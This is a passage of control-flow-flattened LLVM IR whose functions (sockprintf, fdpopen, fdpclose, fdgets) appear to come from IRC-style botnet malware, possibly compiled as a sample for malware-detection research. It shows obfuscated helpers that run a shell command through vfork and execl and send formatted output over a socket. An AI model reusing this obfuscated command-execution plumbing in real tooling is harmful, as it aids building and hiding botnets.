  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 612985135, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 312795453, i32 1851497402
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 305127453, i32 1990725227
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 1990725227, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 612985135, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -241109979, i32 579443153
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -382160674, i32 1498891560
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 1639544950, i32 1498891560
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 -344907266, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 -344907266, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 579443153, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 1339692085, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 1610945121, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1610945121, label %first
    i32 1540681659, label %8
    i32 611726013, label %16
    i32 -2043438904, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 1540681659, i32 611726013
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 -2043438904, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 -2043438904, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %.reg2mem4 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1610270951, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 1610270951, label %first
    i32 1183794629, label %15
    i32 -1236637594, label %21
    i32 -776612099, label %28
    i32 -56302647, label %29
    i32 79401964, label %34
    i32 252089083, label %35
    i32 -756745389, label %39
    i32 1933695064, label %43
    i32 -1918342684, label %44
    i32 -251188868, label %54
    i32 1459126599, label %55
    i32 646658850, label %61
    i32 -1397724024, label %NodeBlock
    i32 1214308184, label %LeafBlock1
    i32 174076044, label %LeafBlock
    i32 724129526, label %66
    i32 -140379413, label %73
    i32 -1115402271, label %79
    i32 1276142492, label %84
    i32 -875627657, label %91
    i32 1059992473, label %95
    i32 420309569, label %100
    i32 2021786708, label %107
    i32 817354308, label %111
    i32 -89668326, label %NewDefault
    i32 -1588518646, label %114
    i32 -853050601, label %120
    i32 375152291, label %126
    i32 -871571335, label %132
    i32 -984190786, label %139
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, 114
  %14 = select i1 %13, i32 1183794629, i32 -1236637594
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %5, align 8
  %17 = load i8, i8* %16, align 1
  %18 = zext i8 %17 to i32
  %19 = icmp ne i32 %18, 119
  %20 = select i1 %19, i32 -776612099, i32 -1236637594
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %5, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 -776612099, i32 -56302647
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -984190786, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %31 = call i32 @pipe(i32* %30) #2
  %32 = icmp slt i32 %31, 0
  %33 = select i1 %32, i32 79401964, i32 252089083
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -984190786, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32*, i32** @fdopen_pids, align 8
  %37 = icmp eq i32* %36, null
  %38 = select i1 %37, i32 -756745389, i32 646658850
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @getdtablesize() #2
  store i32 %40, i32* %8, align 4
  %41 = icmp sle i32 %40, 0
  %42 = select i1 %41, i32 1933695064, i32 -1918342684
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -984190786, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 4
  %48 = trunc i64 %47 to i32
  %49 = zext i32 %48 to i64
  %50 = call noalias i8* @malloc(i64 %49) #2
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** @fdopen_pids, align 8
  %52 = icmp eq i32* %51, null
  %53 = select i1 %52, i32 -251188868, i32 1459126599
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -984190786, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 4
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 1, i1 false)
  store i32 646658850, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @vfork() #11
  store i32 %62, i32* %.reg2mem4
  %.reload8 = load volatile i32, i32* %.reg2mem4
  store i32 %.reload8, i32* %9, align 4
  store i32 -1397724024, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem4
  %Pivot = icmp slt i32 %.reload7, 0
  %63 = select i1 %Pivot, i32 174076044, i32 1214308184
  store i32 %63, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf2 = icmp eq i32 %.reload5, 0
  %64 = select i1 %SwitchLeaf2, i32 -140379413, i32 -89668326
  store i32 %64, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload6 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf = icmp eq i32 %.reload6, -1
  %65 = select i1 %SwitchLeaf, i32 724129526, i32 -89668326
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @close(i32 %71)
  store i32 -1, i32* %3, align 4
  store i32 -984190786, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 114
  %78 = select i1 %77, i32 -1115402271, i32 1059992473
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
  %82 = icmp ne i32 %81, 1
  %83 = select i1 %82, i32 1276142492, i32 -875627657
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @dup2(i32 %86, i32 1) #2
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @close(i32 %89)
  store i32 -875627657, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @close(i32 %93)
  store i32 817354308, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 420309569, i32 2021786708
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @dup2(i32 %102, i32 0) #2
  %104 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  store i32 2021786708, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 817354308, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.306, i32 0, i32 0), i8* %112, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

NewDefault:                                       ; preds = %loopEntry
  store i32 -1588518646, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 114
  %119 = select i1 %118, i32 -853050601, i32 375152291
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %122 = load i32, i32* %121, align 4
  store i32 %122, i32* %6, align 4
  %123 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @close(i32 %124)
  store i32 -871571335, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %128 = load i32, i32* %127, align 4
  store i32 %128, i32* %6, align 4
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  store i32 -871571335, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %9, align 4
  %134 = load i32*, i32** @fdopen_pids, align 8
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 %133, i32* %137, align 4
  %138 = load i32, i32* %6, align 4
  store i32 %138, i32* %3, align 4
  store i32 -984190786, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %3, align 4
  ret i32 %140

loopEnd:                                          ; preds = %132, %126, %120, %114, %NewDefault, %107, %100, %95, %91, %84, %79, %73, %66, %LeafBlock, %LeafBlock1, %NodeBlock, %61, %55, %54, %44, %43, %39, %35, %34, %29, %28, %21, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  store i32* %10, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 -1016527790, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1016527790, label %first
    i32 215123, label %13
    i32 -913178501, label %21
    i32 -1854202818, label %22
    i32 1484888541, label %30
    i32 -565891952, label %37
    i32 -338412952, label %41
    i32 634051043, label %45
    i32 -1956325383, label %47
    i32 -1730205240, label %56
    i32 83774457, label %57
    i32 1290521283, label %64
    i32 1689793795, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %11 = icmp eq i32* %.reload, null
  %12 = select i1 %11, i32 -913178501, i32 215123
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = load i32, i32* %3, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i32, i32* %14, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = icmp eq i32 %18, 0
  %20 = select i1 %19, i32 -913178501, i32 -1854202818
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 1689793795, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  %25 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %27 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %28 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %29 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  store i32 1484888541, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32*, i32** @fdopen_pids, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @waitpid(i32 %35, i32* %7, i32 0)
  store i32 %36, i32* %8, align 4
  store i32 -565891952, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 -338412952, i32 634051043
  store i32 %40, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #13
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 4
  store i32 634051043, i32* %switchVar
  store i1 %44, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %46 = select i1 %.reload3, i32 1484888541, i32 -1956325383
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 0, i32* %52, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 -1730205240, i32 83774457
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 1290521283, i32* %switchVar
  store i32 -1, i32* %.reg2mem4
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast %struct.in_addr* %9 to i32*
  %59 = load i32, i32* %7, align 4
  store i32 %59, i32* %58, align 4
  %60 = bitcast %struct.in_addr* %9 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  store i32 1290521283, i32* %switchVar
  store i32 %63, i32* %.reg2mem4
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %2, align 4
  store i32 1689793795, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  ret i32 %66

loopEnd:                                          ; preds = %64, %57, %56, %47, %45, %41, %37, %30, %22, %21, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -856920605, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -856920605, label %9
    i32 1369470075, label %13
    i32 1943178040, label %18
    i32 -229087787, label %27
    i32 -277759645, label %29
    i32 1932105691, label %39
    i32 -2028089004, label %43
    i32 -1762678235, label %44
    i32 -1879428426, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 1369470075, i32 -229087787
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 1943178040, i32 -229087787
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 -229087787, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 -277759645, i32 1932105691
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 -856920605, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 -2028089004, i32 -1762678235
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1879428426, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 -1879428426, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #3

